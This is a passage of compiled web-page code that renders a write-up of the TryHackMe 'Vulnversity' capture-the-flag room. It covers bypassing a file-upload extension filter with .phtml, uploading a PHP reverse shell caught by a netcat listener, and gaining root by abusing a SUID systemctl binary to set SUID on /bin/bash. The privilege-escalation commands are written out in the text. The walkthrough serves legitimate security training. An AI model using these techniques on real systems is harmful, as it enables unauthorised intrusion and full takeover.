Xr=o(Es);h(Fe.$$.fragment,Xr),Xr.forEach(t),Io=p(wt),ys=a(wt,"LI",{});var Yr=o(ys);Ao=r(Yr,"Navigating to this dir we can see there is a upload form"),Yr.forEach(t),Co=p(wt),gs=a(wt,"LI",{});var ei=o(gs);h(me.$$.fragment,ei),ei.forEach(t),wt.forEach(t),Hl.forEach(t),Nl.forEach(t),bl=p(s),Ee=a(s,"H6",{id:!0});var ti=o(Ee);pt=a(ti,"A",{href:!0});var si=o(pt);To=r(si,"Task 4"),si.forEach(t),ti.forEach(t),Ll=p(s),P=a(s,"UL",{});var Dt=o(P);ct=a(Dt,"LI",{});var Zn=o(ct);xo=r(Zn,"Let’s see what we can do with it. At first we should see what files we are allowed upload. I tried uploading a jpg file "),ye=a(Zn,"UL",{});var ql=o(ye);_s=a(ql,"LI",{});var li=o(_s);h(ge.$$.fragment,li),li.forEach(t),Oo=p(ql),ws=a(ql,"LI",{});var ai=o(ws);h(_e.$$.fragment,ai),ai.forEach(t),ql.forEach(t),Zn.forEach(t),Uo=p(Dt),dt=a(Dt,"LI",{});var jn=o(dt);So=r(jn,"It’s not allowed. We can try uploading a php file. See if we can get the php info"),we=a(jn,"UL",{});var Gl=o(we);Ds=a(Gl,"LI",{});var oi=o(Ds);h(De.$$.fragment,oi),oi.forEach(t),Po=p(Gl),$s=a(Gl,"LI",{});var ni=o($s);h($e.$$.fragment,ni),ni.forEach(t),Gl.forEach(t),jn.forEach(t),Wo=p(Dt),ks=a(Dt,"LI",{});var ri=o(ks);No=r(ri,"We can’t upload any php file. If we do this manually it’ll take unnecessary time & effort. Let’s automate this process. First we have to see how the file upload is working. We can use burp or simply the network tab of our browser. We can use burp to check which extension will not be blocked. But I’ll write a simple python script to do this."),ri.forEach(t),Dt.forEach(t),Il=p(s),bs=hl(s,!1),Ls=p(s),I=a(s,"UL",{});var se=o(I);Q=a(se,"LI",{});var dl=o(Q);Bo=r(dl,"So this script is basically going through each extension of the extensions list & checking if the file extension is allowed or not & renaming it then sending the file to the web-server using the requests module. So we can the "),Is=a(dl,"CODE",{});var ii=o(Is);Ho=r(ii,".phtml"),ii.forEach(t),Vo=r(dl," is allowed"),As=a(dl,"UL",{});var pi=o(As);Cs=a(pi,"LI",{});var ci=o(Cs);h(ke.$$.fragment,ci),ci.forEach(t),pi.forEach(t),dl.forEach(t),qo=p(se),ft=a(se,"LI",{});var zn=o(ft);Go=r(zn,"Rev-shell time. I’m using the one which comes default with kali(pentestmoney).In the shell we have to change these 2 variables"),be=a(zn,"UL",{});var Rl=o(be);Ts=a(Rl,"LI",{});var di=o(Ts);h(Le.$$.fragment,di),di.forEach(t),Ro=p(Rl),xs=a(Rl,"LI",{});var fi=o(xs);h(Ie.$$.fragment,fi),fi.forEach(t),Rl.forEach(t),zn.forEach(t),Zo=p(se),ut=a(se,"LI",{});var Mn=o(ut);jo=r(Mn,"Success. Next setup a netcat listener & navigate to the file on the server."),V=a(Mn,"UL",{});var $t=o(V);Os=a($t,"LI",{});var ui=o(Os);h(Ae.$$.fragment,ui),ui.forEach(t),zo=p($t),Us=a($t,"LI",{});var hi=o(Us);h(Ce.$$.fragment,hi),hi.forEach(t),Mo=p($t),Ss=a($t,"LI",{});var vi=o(Ss);h(Te.$$.fragment,vi),vi.forEach(t),$t.forEach(t),Mn.forEach(t),Ko=p(se),Ps=a(se,"LI",{});var Fi=o(Ps);Jo=r(Fi,"We got the shell but it’s limited. We have to stabilize it."),Fi.forEach(t),se.forEach(t),Al=p(s),Ws=hl(s,!1),Ns=p(s),ht=a(s,"UL",{});var mi=o(ht);xe=a(mi,"LI",{});var Zl=o(xe);Qo=r(Zl,"We got the user flag. User is "),Bs=a(Zl,"CODE",{});var Ei=o(Bs);Xo=r(Ei,"Bill"),Ei.forEach(t),Hs=a(Zl,"UL",{});var yi=o(Hs);Vs=a(yi,"LI",{});var gi=o(Vs);h(Oe.$$.fragment,gi),gi.forEach(t),yi.forEach(t),Zl.forEach(t),mi.forEach(t),Cl=p(s),Ue=a(s,"H6",{id:!0});var _i=o(Ue);vt=a(_i,"A",{href:!0});var wi=o(vt);Yo=r(wi,"Task 5"),wi.forEach(t),_i.forEach(t),Tl=p(s),$=a(s,"UL",{});var T=o($);qs=a(T,"LI",{});var Di=o(qs);Ft=a(Di,"P",{});var Kn=o(Ft);en=r(Kn,"Now Privilege Escalation. As this task suggests we’re gonna search for "),X=a(Kn,"A",{href:!0,rel:!0,target:!0});var $i=o(X);tn=r($i,"SUID binaries"),$i.forEach(t),Kn.forEach(t),Di.forEach(t),sn=p(T),Gs=a(T,"LI",{});var ki=o(Gs);mt=a(ki,"P",{});var Jn=o(mt);ln=r(Jn,"Search for SUID bits on the machine "),Rs=a(Jn,"CODE",{});var bi=o(Rs);an=r(bi,"find / -perm -u=s -type f 2>/dev/null"),bi.forEach(t),Jn.forEach(t),ki.forEach(t),on=p(T),Se=a(T,"LI",{});var jl=o(Se);Zs=a(jl,"P",{});var Li=o(Zs);nn=r(Li,"There is an unusual binary here"),Li.forEach(t),rn=p(jl),js=a(jl,"UL",{});var Ii=o(js);zs=a(Ii,"LI",{});var Ai=o(zs);h(Pe.$$.fragment,Ai),Ai.forEach(t),Ii.forEach(t),jl.forEach(t),pn=p(T),We=a(T,"LI",{});var zl=o(We);Et=a(zl,"P",{});var Qn=o(Et);Y=a(Qn,"A",{href:!0,rel:!0,target:!0});var Ci=o(Y);cn=r(Ci,"GTFO bins"),Ci.forEach(t),dn=r(Qn," is the goto for any kind of binary based Privilege Escalation."),Qn.forEach(t),fn=p(zl),Ms=a(zl,"UL",{});var Ti=o(Ms);Ks=a(Ti,"LI",{});var xi=o(Ks);h(Ne.$$.fragment,xi),xi.forEach(t),Ti.forEach(t),zl.forEach(t),un=p(T),Js=a(T,"LI",{});var Oi=o(Js);A=a(Oi,"P",{});var G=o(A);hn=r(G,"So we’ll make a "),Qs=a(G,"CODE",{});var Ui=o(Qs);vn=r(Ui,"System service"),Ui.forEach(t),Fn=r(G," named "),Xs=a(G,"CODE",{});var Si=o(Xs);mn=r(Si,"systemctl"),Si.forEach(t),En=r(G," & run it using it’s relative path "),Ys=a(G,"CODE",{});var Pi=o(Ys);yn=r(Pi,"./systemctl"),Pi.forEach(t),gn=r(G," & we’ll execute the command "),el=a(G,"CODE",{});var Wi=o(el);_n=r(Wi,'/bin/bash -c "id > /tmp/output"'),Wi.forEach(t),G.forEach(t),Oi.forEach(t),wn=p(T),tl=a(T,"LI",{});var Ni=o(tl);q=a(Ni,"P",{});var kt=o(q);Dn=r(kt,"The above method dosen’t work so I used this one. This one is simple I’m creating a service and giving "),sl=a(kt,"CODE",{});var Bi=o(sl);$n=r(Bi,"/bin/bash"),Bi.forEach(t),kn=r(kt," SUID permission with "),ll=a(kt,"CODE",{});var Hi=o(ll);bn=r(Hi,"+s"),Hi.forEach(t),Ln=r(kt," option. Then executing it using the original systemctl binary."),kt.forEach(t),Ni.forEach(t),T.forEach(t),xl=p(s),al=hl(s,!1),ol=p(s),yt=a(s,"UL",{});var Vi=o(yt);ee=a(Vi,"LI",{});var fl=o(ee);In=r(fl,"If we do "),nl=a(fl,"CODE",{});var qi=o(nl);An=r(qi,"bash -p"),qi.forEach(t),Cn=r(fl," now we can see we have effective id as root. So we own the system now"),rl=a(fl,"UL",{});var Gi=o(rl);il=a(Gi,"LI",{});var Ri=o(il);h(Be.$$.fragment,Ri),Ri.forEach(t),Gi.forEach(t),fl.forEach(t),Vi.forEach(t),this.h()},h(){_(k,"href","https://tryhackme.com/room/vulnversity"),_(k,"rel","nofollow noopener noreferrer external"),_(k,"target","_blank"),R.a=bt,_(Xe,"href","#task-2"),_(oe,"id","task-2"),_(et,"href","#task-3"),_(fe,"id","task-3"),_(M,"href","https://github.com/OJ/gobuster"),_(M,"rel","nofollow noopener noreferrer external"),_(M,"target","_blank"),us.a=hs,_(pt,"href","#task-4"),_(Ee,"id","task-4"),bs.a=Ls,Ws.a=Ns,_(vt,"href","#task-5"),_(Ue,"id","task-5"),_(X,"href","https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/"),_(X,"rel","nofollow noopener noreferrer external"),_(X,"target","_blank"),_(Y,"href","https://gtfobins.github.io/#"),_(Y,"rel","nofollow noopener noreferrer external"),_(Y,"target","_blank"),al.a=ol},m(s,c){d(s,f,c),e(f,O),e(f,k),e(k,le),e(f,g),d(s,L,c),R.m(Mi,s,c),d(s,bt,c),d(s,Ge,c),e(Ge,Re),e(Re,Ml),e(Re,w),e(w,Ze),e(Ze,Lt),e(Lt,Kl),e(Ze,Jl),e(w,Ql),e(w,je),e(je,It),e(It,Xl),e(je,Yl),e(w,ea),e(w,ze),e(ze,At),e(At,ta),e(ze,sa),e(w,la),e(w,Me),e(Me,Ct),e(Ct,aa),e(Me,oa),e(w,na),e(w,Ke),e(Ke,Tt),e(Tt,ra),e(Ke,ia),e(w,pa),e(w,Je),e(Je,xt),e(xt,ca),e(Je,da),e(w,fa),e(w,Qe),e(Qe,Ot),e(Ot,ua),e(Qe,ha),d(s,vl,c),d(s,Z,c),e(Z,Ut),e(Ut,St),e(St,Pt),e(Pt,va),e(Z,Fa),e(Z,Wt),v(ae,Wt,null),d(s,Fl,c),d(s,oe,c),e(oe,Xe),e(Xe,ma),d(s,ml,c),d(s,D,c),e(D,Ye),e(Ye,Ea),e(Ye,Nt),e(Nt,ya),e(D,ga),e(D,j),e(j,_a),e(j,Bt),e(Bt,wa),e(j,Da),e(j,Ht),e(Ht,Vt),v(ne,Vt,null),e(D,$a),e(D,U),e(U,ka),e(U,qt),e(qt,ba),e(U,La),e(U,Gt),e(Gt,Ia),e(U,Aa),e(U,Rt),e(Rt,Zt),v(re,Zt,null),e(D,Ca),e(D,W),e(W,Ta),e(W,jt),e(jt,xa),e(W,Oa),e(W,zt),e(zt,Ua),e(W,Mt),e(Mt,Kt),v(ie,Kt,null),e(D,Sa),e(D,S),e(S,Pa),e(S,Jt),e(Jt,Wa),e(S,Na),e(S,Qt),e(Qt,Ba),e(S,Ha),e(S,Xt),e(Xt,Yt),v(pe,Yt,null),e(D,Va),e(D,ce),e(ce,qa),e(ce,es),e(es,Ga),e(ce,ts),e(ts,ss),v(de,ss,null),d(s,El,c),d(s,fe,c),e(fe,et),e(et,Ra),d(s,yl,c),d(s,z,c),e(z,Za),e(z,ls),e(ls,ja),e(z,za),d(s,gl,c),d(s,tt,c),e(tt,Ma),d(s,_l,c),d(s,N,c),e(N,Ka),e(N,M),e(M,Ja),e(N,Qa),e(N,as),e(as,Xa),d(s,wl,c),d(s,st,c),e(st,os),e(os,Ya),d(s,Dl,c),d(s,lt,c),e(lt,ns),e(ns,eo),d(s,$l,c),d(s,K,c),e(K,at),e(at,to),e(at,x),e(x,ot),e(ot,rs),e(rs,so),e(ot,lo),e(x,ao),e(x,nt),e(nt,is),e(is,oo),e(nt,no),e(x,ro),e(x,rt),e(rt,ps),e(ps,io),e(rt,po),e(x,co),e(x,it),e(it,cs),e(cs,fo),e(it,uo),e(K,ho),e(K,B),e(B,vo),e(B,ds),e(ds,Fo),e(B,mo),e(B,fs),e(fs,Eo),e(B,yo),d(s,kl,c),us.m(Ki,s,c),d(s,hs,c),d(s,J,c),e(J,vs),e(vs,ue),e(ue,go),e(ue,Fs),e(Fs,_o),e(ue,wo),e(J,Do),e(J,he),e(he,ve),e(ve,$o),e(ve,ms),e(ms,ko),e(ve,bo),e(he,Lo),e(he,H),e(H,Es),v(Fe,Es,null),e(H,Io),e(H,ys),e(ys,Ao),e(H,Co),e(H,gs),v(me,gs,null),d(s,bl,c),d(s,Ee,c),e(Ee,pt),e(pt,To),d(s,Ll,c),d(s,P,c),e(P,ct),e(ct,xo),e(ct,ye),e(ye,_s),v(ge,_s,null),e(ye,Oo),e(ye,ws),v(_e,ws,null),e(P,Uo),e(P,dt),e(dt,So),e(dt,we),e(we,Ds),v(De,Ds,null),e(we,Po),e(we,$s),v($e,$s,null),e(P,Wo),e(P,ks),e(ks,No),d(s,Il,c),bs.m(Ji,s,c),d(s,Ls,c),d(s,I,c),e(I,Q),e(Q,Bo),e(Q,Is),e(Is,Ho),e(Q,Vo),e(Q,As),e(As,Cs),v(ke,Cs,null),e(I,qo),e(I,ft),e(ft,Go),e(ft,be),e(be,Ts),v(Le,Ts,null),e(be,Ro),e(be,xs),v(Ie,xs,null),e(I,Zo),e(I,ut),e(ut,jo),e(ut,V),e(V,Os),v(Ae,Os,null),e(V,zo),e(V,Us),v(Ce,Us,null),e(V,Mo),e(V,Ss),v(Te,Ss,null),e(I,Ko),e(I,Ps),e(Ps,Jo),d(s,Al,c),Ws.m(Qi,s,c),d(s,Ns,c),d(s,ht,c),e(ht,xe),e(xe,Qo),e(xe,Bs),e(Bs,Xo),e(xe,Hs),e(Hs,Vs),v(Oe,Vs,null),d(s,Cl,c),d(s,Ue,c),e(Ue,vt),e(vt,Yo),d(s,Tl,c),d(s,$,c),e($,qs),e(qs,Ft),e(Ft,en),e(Ft,X),e(X,tn),e($,sn),e($,Gs),e(Gs,mt),e(mt,ln),e(mt,Rs),e(Rs,an),e($,on),e($,Se),e(Se,Zs),e(Zs,nn),e(Se,rn),e(Se,js),e(js,zs),v(Pe,zs,null),e($,pn),e($,We),e(We,Et),e(Et,Y),e(Y,cn),e(Et,dn),e(We,fn),e(We,Ms),e(Ms,Ks),v(Ne,Ks,null),e($,un),e($,Js),e(Js,A),e(A,hn),e(A,Qs),e(Qs,vn),e(A,Fn),e(A,Xs),e(Xs,mn),e(A,En),e(A,Ys),e(Ys,yn),e(A,gn),e(A,el),e(el,_n),e($,wn),e($,tl),e(tl,q),e(q,Dn),e(q,sl),e(sl,$n),e(q,kn),e(q,ll),e(ll,bn),e(q,Ln),d(s,xl,c),al.m(Xi,s,c),d(s,ol,c),d(s,yt,c),e(yt,ee),e(ee,In),e(ee,nl),e(nl,An),e(ee,Cn),e(ee,rl),e(rl,il),v(Be,il,null),Ol=!0},p:lp,i(s){Ol||(F(ae.$$.fragment,s),F(ne.$$.fragment,s),F(re.$$.fragment,s),F(ie.$$.fragment,s),F(pe.$$.fragment,s),F(de.$$.fragment,s),F(Fe.$$.fragment,s),F(me.$$.fragment,s),F(ge.$$.fragment,s),F(_e.$$.fragment,s),F(De.$$.fragment,s),F($e.$$.fragment,s),F(ke.$$.fragment,s),F(Le.$$.fragment,s),F(Ie.$$.fragment,s),F(Ae.$$.fragment,s),F(Ce.$$.fragment,s),F(Te.$$.fragment,s),F(Oe.$$.fragment,s),F(Pe.$$.fragment,s),F(Ne.$$.fragment,s),F(Be.$$.fragment,s),Ol=!0)},o(s){m(ae.$$.fragment,s),m(ne.$$.fragment,s),m(re.$$.fragment,s),m(ie.$$.fragment,s),m(pe.$$.fragment,s),m(de.$$.fragment,s),m(Fe.$$.fragment,s),m(me.$$.fragment,s),m(ge.$$.fragment,s),m(_e.$$.fragment,s),m(De.$$.fragment,s),m($e.$$.fragment,s),m(ke.$$.fragment,s),m(Le.$$.fragment,s),m(Ie.$$.fragment,s),m(Ae.$$.fragment,s),m(Ce.$$.fragment,s),m(Te.$$.fragment,s),m(Oe.$$.fragment,s),m(Pe.$$.fragment,s),m(Ne.$$.fragment,s),m(Be.$$.fragment,s),Ol=!1},d(s){s&&t(f),s&&t(L),s&&R.d(),s&&t(bt),s&&t(Ge),s&&t(vl),s&&t(Z),E(ae),s&&t(Fl),s&&t(oe),s&&t(ml),s&&t(D),E(ne),E(re),E(ie),E(pe),E(de),s&&t(El),s&&t(fe),s&&t(yl),s&&t(z),s&&t(gl),s&&t(tt),s&&t(_l),s&&t(N),s&&t(wl),s&&t(st),s&&t(Dl),s&&t(lt),s&&t($l),s&&t(K),s&&t(kl),s&&us.d(),s&&t(hs),s&&t(J),E(Fe),E(me),s&&t(bl),s&&t(Ee),s&&t(Ll),s&&t(P),E(ge),E(_e),E(De),E($e),s&&t(Il),s&&bs.d(),s&&t(Ls),s&&t(I),E(ke),E(Le),E(Ie),E(Ae),E(Ce),E(Te),s&&t(Al),s&&Ws.d(),s&&t(Ns),s&&t(ht),E(Oe),s&&t(Cl),s&&t(Ue),s&&t(Tl),s&&t($),E(Pe),E(Ne),s&&t(xl),s&&al.d(),s&&t(ol),s&&t(yt),E(Be)}}}function np(qe){let f,O;const k=[qe[0],zi];let le={$$slots:{default:[op]},$$scope:{ctx:qe}};for(let g=0;g<k.length;g+=1)le=Xn(le,k[g]);return f=new ap({props:le}),{c(){u(f.$$.fragment)},l(g){h(f.$$.fragment,g)},m(g,L){v(f,g,L),O=!0},p(g,[L]){const R=L&1?sp(k,[L&1&&Zi(g[0]),L&0&&Zi(zi)]):{};L&2&&(R.$$scope={dirty:L,ctx:g}),f.$set(R)},i(g){O||(F(f.$$.fragment,g),O=!0)},o(g){m(f.$$.fragment,g),O=!1},d(g){E(f,g)}}}const zi={title:"TryHackMe Vulnversity",image:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png",created:"2021-08-09T00:00:00.000Z",updated:"2022-12-19T00:00:00.000Z",tags:["tryhackme","ctf","file upload"],flags:[],slug:"/TryHackme/Vulnversity/+page.svelte.md",path:"/TryHackme/Vulnversity",toc:[{depth:6,title:"Task 2",slug:"task-2"},{depth:6,title:"Task 3",slug:"task-3"},{depth:6,title:"Task 4",slug:"task-4"},{depth:6,title:"Task 5",slug:"task-5"}]};function rp(qe,f,O){return qe.$$set=k=>{O(0,f=Xn(Xn({},f),ji(k)))},f=ji(f),[f]}class dp extends Yi{constructor(f){super(),ep(this,f,rp,np,tp,{})}}export{dp as default,zi as metadata};
